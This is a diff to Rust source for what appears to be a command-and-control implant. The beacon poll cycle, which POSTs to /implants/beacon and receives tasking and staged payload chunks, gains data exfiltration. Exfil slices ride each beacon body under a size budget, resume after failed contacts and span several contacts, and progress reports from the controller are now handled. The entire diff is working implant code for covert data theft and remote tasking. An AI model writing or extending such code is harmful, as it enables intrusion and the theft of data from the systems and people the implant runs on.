@@ -6,16 +6,18 @@ use super::{accept_tasking, Contact};
 use crate::error::ContactError;
 use crate::profile::Profile;
 use crate::session::{Attempt, Session};
-use crate::wire::{Frame, StagedChunk};
+use crate::wire::{ExfilProgress, Frame, FrameKind, StagedChunk};
 
 /// The envelope POST cycle (architecture.md Sec 8): one POST to
 /// /implants/beacon is one poll contact. The request body carries the
-/// handshake, the staged demands at their current seams, and the accumulated
-/// batch; the response carries the handshake answer, the staged chunk runs
-/// answering those demands, then queued tasking. The batch leaves only after
-/// a processed response, so a failed POST re-sends it verbatim; a staged
-/// transfer's held bytes survive the failure on the session, so its next
-/// demand resumes instead of restarting.
+/// handshake, the staged demands at their current seams, the accumulated
+/// batch, and the exfil run slices the body budget admits; the response
+/// carries the handshake answer, the seam reports for the slices placed, the
+/// staged chunk runs answering those demands, then queued tasking. The batch
+/// leaves only after a processed response, so a failed POST re-sends it
+/// verbatim; a staged transfer's held bytes and an exfil run's confirmed
+/// seam survive the failure on the session, so both resume instead of
+/// restarting -- and a run larger than one body spans contacts.
 pub struct Poll {
     url: String,
     agent: ureq::Agent,
@@ -37,10 +39,12 @@ impl Contact for Poll {
         session.drain_channels();
         let demands = session.staged_demands();
         let batch = session.outbox.batch();
-        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len());
+        let exfil = session.exfil_frames(crate::session::EXFIL_CONTACT_BUDGET);
+        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len() + exfil.len());
         frames.push(session.handshake_frame());
         frames.extend(demands);
         frames.extend(batch.iter().cloned());
+        frames.extend(exfil);
         let (body, content_type) = session.encode_outgoing(&frames);
 
         let response = self
@@ -81,6 +85,7 @@ impl Contact for Poll {
         // output; it queues now and rides the next cycle.
         session.drain_channels();
         session.staged_cycle_end();
+        session.exfil_cycle_end();
         Ok(Attempt::Crossed)
     }
 }
@@ -88,11 +93,24 @@ impl Contact for Poll {
 /// The staged half of a poll response: every chunk run the response carries,
 /// routed by task id into the session's transfer state -- placement, resume
 /// bookkeeping, and the terminal dispatch live there, shared with every
-/// other carriage (ADR-010).
+/// other carriage (ADR-010). The seam reports for this contact's exfil
+/// slices land here too, in the same kind-discriminated pass.
 pub fn accept_staged(session: &mut Session, inbound: &[Frame]) {
     for frame in inbound.iter().skip(1) {
-        if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
-            session.accept_staged_chunk(&chunk);
+        match frame.kind() {
+            FrameKind::ExfilProgress => {
+                if let Ok(progress) = ExfilProgress::decode(frame.payload.as_ref()) {
+                    session.exfil_progress(&progress.task_id, &progress.name, progress.held_bytes);
+                }
+            }
+            // The staged chunk run rides kindless frames (the positional
+            // downstream shape); a kind-bearing frame is never one.
+            FrameKind::Unspecified => {
+                if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
+                    session.accept_staged_chunk(&chunk);
+                }
+            }
+            _ => {}
         }
     }
 }
